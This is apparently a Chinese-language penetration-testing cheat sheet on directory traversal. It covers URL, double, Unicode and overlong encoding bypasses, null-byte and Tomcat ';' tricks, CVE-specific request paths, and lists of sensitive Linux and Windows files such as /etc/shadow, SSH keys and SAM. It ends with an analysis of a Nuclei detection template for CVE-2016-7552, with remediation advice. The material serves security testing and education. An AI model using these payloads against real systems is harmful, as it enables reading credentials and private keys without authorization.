# 目录遍历 (Directory Traversal)

> 目录遍历（也称为路径遍历）是一种安全漏洞，当攻击者能够操纵包含"点点斜杠(../)"或类似结构的文件引用变量时发生。这可能使攻击者能够访问文件系统上存储的任意文件和目录。

## 目录

* [工具](#工具)
* [方法学](#方法学)
    * [URL编码](#url编码)
    * [双重URL编码](#双重url编码)
    * [Unicode编码](#unicode编码)
    * [过长的UTF-8 Unicode编码](#过长的utf-8-unicode编码)
    * [混淆路径](#混淆路径)
    * [空字节](#空字节)
    * [反向代理URL实现](#反向代理url实现)
* [利用](#利用)
    * [UNC共享](#unc共享)
    * [ASP.NET无Cookie会话](#aspnet-无cookie会话)
    * [IIS短名称](#iis-短名称)
    * [Java URL协议](#java-url协议)
* [路径遍历](#路径遍历)
    * [Linux文件](#linux文件)
    * [Windows文件](#windows文件)
* [实验环境](#实验环境)
* [参考资料](#参考资料)

## 工具

* [wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn) - 目录遍历模糊测试工具

    ```powershell
    perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
    ```

## 方法学

我们可以使用 `..` 字符来访问父目录，以下是几种编码方式，可以帮助您绕过简单的过滤器。

```powershell
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
```

### URL编码

| 字符 | 编码后 |
| --- | -------- |
| `.` | `%2e` |
| `/` | `%2f` |
| `\` | `%5c` |

**示例：** IPConfigure Orchid Core VMS 2.0.5 - 本地文件包含

```ps1
{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
```

### 双重URL编码

双重URL编码是对字符串应用两次URL编码的过程。在URL编码中，特殊字符被替换为%后跟其十六进制ASCII值。双重编码会对已经编码的字符串重复此过程。

| 字符 | 双重编码后 |
| --- | -------- |
| `.` | `%252e` |
| `/` | `%252f` |
| `\` | `%255c` |

**示例：** Spring MVC 目录遍历漏洞 (CVE-2018-1271)

```ps1
{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
```

### Unicode编码

| 字符 | Unicode编码 |
| --- | -------- |
| `.` | `%u002e` |
| `/` | `%u2215` |
| `\` | `%u2216` |

**示例**：Openfire 管理控制台 - 认证绕过 (CVE-2023-32315)

```js
{{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```

### 过长的UTF-8 Unicode编码

UTF-8标准规定每个码点使用表示其有效位所需的最少字节数进行编码。任何使用超过所需字节数的编码都被称为"过长"编码，在UTF-8规范中被视为无效。此规则确保码点与其有效编码之间的一对一映射，保证每个码点都有单一、唯一的表示形式。

| 字符 | 过长编码 |
| --- | -------- |
| `.` | `%c0%2e`, `%e0%40%ae`, `%c0%ae` |
| `/` | `%c0%af`, `%e0%80%af`, `%c0%2f` |
| `\` | `%c0%5c`, `%c0%80%5c` |

### 混淆路径

有时您会遇到一个会删除`../`字符的WAF，只需重复它们即可。

```powershell
..././
...\.\
```

**示例：** Mirasys DVMS Workstation <=5.12.6

```ps1
{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini
```

### 空字节

空字节(`%00`)，也称为空字符，是许多编程语言和系统中的特殊控制字符(0x00)。在C和C++等语言中，它通常用作字符串终止符。在目录遍历攻击中，空字节用于操纵或绕过服务器端输入验证机制。

**示例：** Homematic CCU3 CVE-2019-9726

```js
{{BaseURL}}/.%00./.%00./etc/passwd
```

**示例：** Kyocera Printer d-COPIA253MF CVE-2020-23575

```js
{{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm
```

### 反向代理URL实现

Nginx将`/..;/`视为目录，而Tomcat将其视为`/../`，这允许我们访问任意的servlet。

```powershell
..;/
```

**示例**：Pascom云电话系统 CVE-2021-45967

NGINX和后端Tomcat服务器之间的配置错误导致Tomcat服务器中的路径遍历，暴露出意外的端点。

```js
{{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}
```

## 利用

这些利用方法影响特定技术的机制。

### UNC共享

UNC(通用命名约定)共享是一种标准格式，用于以平台无关的方式指定网络上资源(如共享文件、目录或设备)的位置。它通常在Windows环境中使用，但也受其他操作系统支持。

攻击者可以将**Windows** UNC共享(`\\UNC\share\name`)注入到软件系统中，可能将访问重定向到非预期位置或任意文件。

```powershell
\\localhost\c$\windows\win.ini
```

此外，机器可能还会对此远程共享进行身份验证，从而发送NTLM交换。

### ASP.NET 无Cookie会话

当启用无Cookie会话状态时，ASP.NET不会依赖cookie来识别会话，而是通过将Session ID直接嵌入URL中来修改URL。

例如，典型的URL可能会从：`http://example.com/page.aspx` 转换为类似：`http://example.com/(S(lit3py55t21z5v55vlm25s55))/page.aspx`。`(S(...))`中的值是Session ID。

| .NET 版本   | URI                        |
| -------------- | -------------------------- |
| V1.0, V1.1     | /(XXXXXXXX)/               |
| V2.0+          | /(S(XXXXXXXX))/            |
| V2.0+          | /(A(XXXXXXXX)F(YYYYYYYY))/ |
| V2.0+          | ...                        |


我们可以利用此行为绕过过滤的URL。

* 如果您的应用程序位于主文件夹中

    ```ps1
    /(S(X))/
    /(Y(Z))/
    /(G(AAA-BBB)D(CCC=DDD)E(0-1))/
    /(S(X))/admin/(S(X))/main.aspx
    /(S(x))/b/(S(x))in/Navigator.dll
    ```

* 如果您的应用程序位于子文件夹中

    ```ps1
    /MyApp/(S(X))/
    /admin/(S(X))/main.aspx
    /admin/Foobar/(S(X))/../(S(X))/main.aspx
    ```

## 路径遍历

### Linux 文件

```
/etc/passwd
/etc/shadow
/etc/issue
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/self/environ
/root/.bash_history
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.ssh/id_rsa.keystore
/root/.ssh/id_rsa.pub
/var/log/secure
/var/log/sshd.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access.log
/var/log/httpd/error.log
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
```

### Windows 文件

```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\drivers\etc\networks
C:\Windows\System32\config\SAM
C:\Windows\repair\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\repair\SYSTEM
C:\Windows\win.ini
C:\Windows\System32\inetsrv\MetaBase.xml
C:\Windows\repair\software
C:\Windows\repair\system
C:\Windows\System32\inetsrv\config\applicationHost.config
C:\inetpub\wwwroot\web.config
C:\sysprep.inf
C:\sysprep.xml
C:\sysprep\sysprep.inf
C:\sysprep\sysprep.xml
C:\sysprep\sysprep.ini
C:\sysprep\sysprep.cfg
C:\sysprep\sysprep.reg
C:\sysprep\sysprep.txt
C:\sysprep\sysprep.exe
C:\sysprep\sysprep.inf
C:\sysprep\sysprep.xml
C:\sysprep\sysprep.ini
C:\sysprep\sysprep.cfg
C:\sysprep\sysprep.reg
C:\sysprep\sysprep.txt
C:\sysprep\sysprep.exe
C:\Users\Administrator\NTUser.dat
C:\Users\Administrator\NTUser.ini
C:\Users\Administrator\NTUser.dat.LOG1
C:\Users\Administrator\NTUser.dat.LOG2
C:\Users\Administrator\NTUser.dat{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}.TM.blf
C:\Users\Administrator\NTUser.dat{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}.TMContainer00000000000000000001.regtrans-ms
C:\Users\Administrator\NTUser.dat{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}.TMContainer00000000000000000002.regtrans-ms
C:\Users\Administrator\AppData\Local\Microsoft\Windows\UsrClass.dat
C:\Users\Administrator\AppData\Local\Microsoft\Windows\UsrClass.dat.LOG1
C:\Users\Administrator\AppData\Local\Microsoft\Windows\UsrClass.dat.LOG2
C:\Users\Administrator\AppData\Local\Microsoft\Windows\UsrClass.dat{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}.TM.blf
C:\Users\Administrator\AppData\Local\Microsoft\Windows\UsrClass.dat{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}.TMContainer00000000000000000001.regtrans-ms
C:\Users\Administrator\AppData\Local\Microsoft\Windows\UsrClass.dat{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}.TMContainer00000000000000000002.regtrans-ms
```

## 实验环境

* [OWASP WebGoat - Path Traversal](https://github.com/WebGoat/WebGoat)
* [DVWA - File Inclusion](http://www.dvwa.co.uk/)
* [bWAPP - Directory Traversal](http://www.itsecgames.com/)
* [Metasploitable2](https://sourceforge.net/projects/metasploitable/)
* [VulnHub - Kioptrix](https://www.vulnhub.com/)
* [Hack The Box](https://www.hackthebox.com/)
* [TryHackMe](https://tryhackme.com/)

## 参考资料

* [OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
* [PortSwigger - Path Traversal](https://portswigger.net/web-security/file-path-traversal)
* [Acunetix - Path Traversal](https://www.acunetix.com/websitesecurity/directory-traversal/)
* [SANS - Detecting and Exploiting Path Traversal](https://www.sans.org/reading-room/whitepapers/securecode/detecting-exploiting-path-traversal-vulnerabilities-36707)
* [CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')](https://cwe.mitre.org/data/definitions/22.html)
* [CWE-23: Relative Path Traversal](https://cwe.mitre.org/data/definitions/23.html)
* [CWE-36: Absolute Path Traversal](https://cwe.mitre.org/data/definitions/36.html)
* [CWE-73: External Control of File Name or Path](https://cwe.mitre.org/data/definitions/73.html)
* [CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')](https://cwe.mitre.org/data/definitions/98.html)
* [CWE-552: Files or Directories Accessible to External Parties](https://cwe.mitre.org/data/definitions/552.html)

# CVE-2016-7552 漏洞分析与检测逻辑

## 漏洞简介

[`CVE-2016-7552.yaml`](../CVE-2016-7552.yaml) 针对的是 Trend Micro Threat Discovery Appliance 2.6.1062r1 版本，存在目录遍历漏洞。攻击者可通过构造恶意的 `session_id` Cookie，实现未授权访问甚至删除任意文件，进而绕过认证或导致拒绝服务。

## 漏洞原理

该设备在处理 `session_id` Cookie 时，未对输入内容进行有效的路径校验。攻击者可利用 `../../../` 等目录遍历手法，将 session_id 指向系统敏感文件（如配置文件），从而实现对这些文件的读取或删除操作。由于认证机制依赖于这些文件，攻击者可借此绕过认证，获取设备的未授权访问权限。

## 检测逻辑（YAML内容解析）

YAML模板内容如下：

```yaml
id: CVE-2016-7552

info:
  name: Trend Micro Threat Discovery Appliance 2.6.1062r1 - Authentication Bypass
  author: dwisiswant0
  severity: critical
  description: Trend Micro Threat Discovery Appliance 2.6.1062r1 is vulnerable to a  directory traversal vulnerability when processing a session_id cookie, which allows a remote, unauthenticated attacker to delete arbitrary files as root. This can be used to bypass authentication or cause a DoS.
  impact: |
    Successful exploitation of this vulnerability allows an attacker to bypass authentication and gain unauthorized access to the appliance.
  remediation: |
    Apply the necessary patch or update provided by Trend Micro to fix the authentication bypass vulnerability.
  reference:
    - https://gist.github.com/malerisch/5de8b408443ee9253b3954a62a8d97b4
    - https://nvd.nist.gov/vuln/detail/CVE-2016-7552
    - https://github.com/rapid7/metasploit-framework/pull/8216/commits/0f07875a2ddb0bfbb4e985ab074e9fc56da1dcf6
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2016-7552
    cwe-id: CWE-22
    epss-score: 0.96711
    epss-percentile: 0.99651
    cpe: cpe:2.3:a:trendmicro:threat_discovery_appliance:2.6.1062:r1:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: trendmicro
    product: threat_discovery_appliance
  tags: cve2016,cve,msf,lfi,auth,bypass,trendmicro

http:
  - method: GET
    path:
      - "{{BaseURL}}/cgi-bin/logoff.cgi"

    headers:
      Cookie: "session_id=../../../opt/TrendMicro/MinorityReport/etc/igsa.conf"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Memory map"

      - type: status
        status:
          - 200
```

### 检测流程说明

1. **请求方式**：GET  
   目标路径为 `/cgi-bin/logoff.cgi`。

2. **关键Header**：  
   设置 `Cookie: session_id=../../../opt/TrendMicro/MinorityReport/etc/igsa.conf`，通过目录遍历指向敏感配置文件。

3. **响应匹配**：  
   - 响应体中包含 `"Memory map"` 字样；
   - HTTP 状态码为 200。

   满足上述条件则判定目标存在该漏洞。

## 修复建议

- 升级 Trend Micro Threat Discovery Appliance 至官方修复版本。
- 对所有用户输入进行严格的路径校验，禁止目录遍历字符（如 `../`）。
- 加强认证机制，避免仅依赖于文件存在性或内容进行认证判断。

## 参考链接

- [NVD - CVE-2016-7552](https://nvd.nist.gov/vuln/detail/CVE-2016-7552)
- [Metasploit PR](https://github.com/rapid7/metasploit-framework/pull/8216/commits/0f07875a2ddb0bfbb4e985ab074e9fc56da1dcf6)
- [原始 PoC](https://gist.github.com/malerisch/5de8b408443ee9253b3954a62a8d97b4)
